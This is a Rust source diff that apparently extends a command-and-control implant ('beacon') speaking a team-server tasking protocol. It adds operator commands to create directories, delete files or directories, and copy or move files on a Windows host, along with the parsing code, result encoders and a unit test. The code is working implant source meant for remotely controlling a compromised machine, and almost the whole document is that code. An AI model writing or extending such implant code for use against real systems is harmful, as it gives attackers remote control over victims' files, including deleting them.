@@ -118,6 +118,10 @@ pub const COMMAND_PWD: u32 = 4;
 pub const COMMAND_CD: u32 = 8;
 pub const COMMAND_LS: u32 = 14;
 pub const COMMAND_CAT: u32 = 24;
+pub const COMMAND_MKDIR: u32 = 27;
+pub const COMMAND_RM: u32 = 17;
+pub const COMMAND_COPY: u32 = 12;
+pub const COMMAND_MV: u32 = 18;
 /// Beacon-side error report: `{COMMAND_ERROR, win32 error code}`.
 pub const COMMAND_ERROR: u32 = 0x1111_FFFF;
 
@@ -141,14 +145,49 @@ pub enum Task {
     Ls { path_len: u16, path: [u8; PATH_CAP] },
     /// `COMMAND_CAT` with the file to read.
     Cat { path_len: u16, path: [u8; PATH_CAP] },
+    /// `COMMAND_MKDIR` with the directory to create.
+    Mkdir { path_len: u16, path: [u8; PATH_CAP] },
+    /// `COMMAND_RM` with the file or directory to delete.
+    Rm { path_len: u16, path: [u8; PATH_CAP] },
+    /// `COMMAND_COPY` with source and destination.
+    Cp {
+        src_len: u16,
+        src: [u8; PATH_CAP],
+        dst_len: u16,
+        dst: [u8; PATH_CAP],
+    },
+    /// `COMMAND_MV` with source and destination.
+    Mv {
+        src_len: u16,
+        src: [u8; PATH_CAP],
+        dst_len: u16,
+        dst: [u8; PATH_CAP],
+    },
 }
 
 impl Task {
+    /// The primary path argument of any path-carrying task (for Cp/Mv:
+    /// the source).
     pub fn path(&self) -> &[u8] {
         match self {
             Task::Cd { path_len, path }
             | Task::Ls { path_len, path }
-            | Task::Cat { path_len, path } => &path[..*path_len as usize],
+            | Task::Cat { path_len, path }
+            | Task::Mkdir { path_len, path }
+            | Task::Rm { path_len, path } => &path[..*path_len as usize],
+            Task::Cp { src_len, src, .. } | Task::Mv { src_len, src, .. } => {
+                &src[..*src_len as usize]
+            }
+            _ => &[],
+        }
+    }
+
+    /// The destination of Cp/Mv (empty elsewhere).
+    pub fn dst(&self) -> &[u8] {
+        match self {
+            Task::Cp { dst_len, dst, .. } | Task::Mv { dst_len, dst, .. } => {
+                &dst[..*dst_len as usize]
+            }
             _ => &[],
         }
     }
@@ -211,6 +250,33 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
             let (path_len, path) = pack_string(r)?;
             Task::Cat { path_len, path }
         }
+        COMMAND_MKDIR => {
+            let (path_len, path) = pack_string(r)?;
+            Task::Mkdir { path_len, path }
+        }
+        COMMAND_RM => {
+            let (path_len, path) = pack_string(r)?;
+            Task::Rm { path_len, path }
+        }
+        COMMAND_COPY | COMMAND_MV => {
+            let (src_len, src) = pack_string(r)?;
+            let (dst_len, dst) = pack_string(r)?;
+            if command == COMMAND_COPY {
+                Task::Cp {
+                    src_len,
+                    src,
+                    dst_len,
+                    dst,
+                }
+            } else {
+                Task::Mv {
+                    src_len,
+                    src,
+                    dst_len,
+                    dst,
+                }
+            }
+        }
         _ => return None,
     };
     let id = r.u32_le()?;
@@ -231,6 +297,21 @@ pub fn finish_results(w: &mut Writer) -> bool {
     let total = w.written() as u32;
     w.backfill_u32_be(0, total);
     true
+}
+
+/// MKDIR result: `array path` (the created directory).
+pub fn push_mkdir_result(w: &mut Writer, task_id: u32, path: &[u8]) -> bool {
+    push_result_header(w, task_id, COMMAND_MKDIR) && w.array(path)
+}
+
+/// RM result: `byte 0` (file deleted) or `byte 1` (directory removed).
+pub fn push_rm_result(w: &mut Writer, task_id: u32, was_dir: bool) -> bool {
+    push_result_header(w, task_id, COMMAND_RM) && w.u8(u8::from(was_dir))
+}
+
+/// CP/MV result: the header alone — the server renders the fixed message.
+pub fn push_plain_result(w: &mut Writer, task_id: u32, command_id: u32) -> bool {
+    push_result_header(w, task_id, command_id)
 }
 
 /// Result record header: `u32 BE taskId || u32 BE commandId`.
@@ -496,6 +577,48 @@ mod tests {
         assert_eq!(&got[..expected.len()], &expected[..]);
         assert_eq!(&got[expected.len()..expected.len() + 3], b"tmp");
         assert_eq!(got.len(), expected.len() + 3);
+    }
+
+    /// Every path-carrying variant must expose its argument — a variant
+    /// missing from `path()`/`dst()` silently produces empty API calls
+    /// (caught first against the live server: `Directory '' created`).
+    #[test]
+    fn task_path_accessors_cover_every_variant() {
+        let mk = |bytes: &[u8]| {
+            let mut buf = [0u8; PATH_CAP];
+            buf[..bytes.len()].copy_from_slice(bytes);
+            (bytes.len() as u16, buf)
+        };
+        let (l, p) = mk(b"C:\\dir");
+        let (sl, sd) = mk(b"C:\\src.txt");
+        let (dl, dd) = mk(b"C:\\dst.txt");
+
+        let cases = [
+            (Task::Cd { path_len: l, path: p }, b"C:\\dir".as_slice()),
+            (Task::Ls { path_len: l, path: p }, b"C:\\dir".as_slice()),
+            (Task::Cat { path_len: l, path: p }, b"C:\\dir".as_slice()),
+            (Task::Mkdir { path_len: l, path: p }, b"C:\\dir".as_slice()),
+            (Task::Rm { path_len: l, path: p }, b"C:\\dir".as_slice()),
+            (
+                Task::Cp { src_len: sl, src: sd, dst_len: dl, dst: dd },
+                b"C:\\src.txt".as_slice(),
+            ),
+            (
+                Task::Mv { src_len: sl, src: sd, dst_len: dl, dst: dd },
+                b"C:\\src.txt".as_slice(),
+            ),
+        ];
+        for (task, want) in cases {
+            assert_eq!(task.path(), want, "path() of {task:?}");
+        }
+        assert_eq!(
+            Task::Cp { src_len: sl, src: sd, dst_len: dl, dst: dd }.dst(),
+            b"C:\\dst.txt".as_slice()
+        );
+        assert_eq!(
+            Task::Mv { src_len: sl, src: sd, dst_len: dl, dst: dd }.dst(),
+            b"C:\\dst.txt".as_slice()
+        );
     }
 
     #[test]
